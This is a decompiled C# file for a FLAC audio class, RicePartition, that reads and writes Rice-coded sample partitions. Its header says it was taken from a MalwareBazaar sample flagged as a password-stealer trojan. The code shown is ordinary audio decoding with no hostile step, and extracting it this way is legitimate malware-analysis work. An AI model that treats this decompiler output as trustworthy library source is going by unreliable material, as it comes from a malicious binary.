// Decompiled with JetBrains decompiler
// Type: flac.Format.RicePartition
// Assembly: STAThreadAttrib, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6EE3DE1A-E148-4FBA-A193-65BEA1824C00
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f6a784c2aa30ddaf03919958455d18bf51533a475c21a73eff578df0174cc5d4.exe

using flac.Io;

namespace flac.Format
{
  public class RicePartition
  {
    private const int ENCODING_PARAMETER_BITS_COUNT = 4;
    private const int BPS_UNENCODED_DATA_BITS_COUNT = 5;
    private sbyte encodingParameter_;
    private sbyte bpsForUnencodedData_;

    public sbyte EncodingParameter
    {
      set => this.encodingParameter_ = value;
    }

    public sbyte BpsForUnencodedData
    {
      set => this.bpsForUnencodedData_ = value;
    }

    public void Read(
      FlacStream stream,
      int sampleCount,
      ref int currentSubframeSample,
      ref uint[] samples)
    {
      this.encodingParameter_ = stream.Reader.ReadBitsAsSByte(4);
      int index = currentSubframeSample;
      int num = index + sampleCount;
      if (this.ParamIsEscapeCode())
      {
        this.bpsForUnencodedData_ = stream.Reader.ReadBitsAsSByte(5);
        for (; index < num; ++index)
          samples[index] = stream.Reader.ReadBitsAsUInt((int) this.bpsForUnencodedData_);
      }
      else
      {
        for (; index < num; ++index)
          samples[index] = (uint) RiceDecoder.GetResidual(stream, this.encodingParameter_);
      }
      currentSubframeSample = index;
    }

    private bool ParamIsEscapeCode() => this.encodingParameter_ > (sbyte) 14;

    public void Write(
      FlacStream stream,
      int sampleCount,
      ref int currentSubframeSample,
      ref uint[] samples)
    {
      stream.Writer.WriteBits((int) this.encodingParameter_, 4);
      int index = currentSubframeSample;
      int num = index + sampleCount;
      if (this.ParamIsEscapeCode())
      {
        stream.Writer.WriteBits((int) this.bpsForUnencodedData_, 5);
        for (; index < num; ++index)
          stream.Writer.WriteBits(samples[index], (int) this.bpsForUnencodedData_);
      }
      else
      {
        for (; index < num; ++index)
          RiceEncoder.PutResidual(stream, (int) samples[index], this.encodingParameter_);
      }
      currentSubframeSample = index;
    }
  }
}
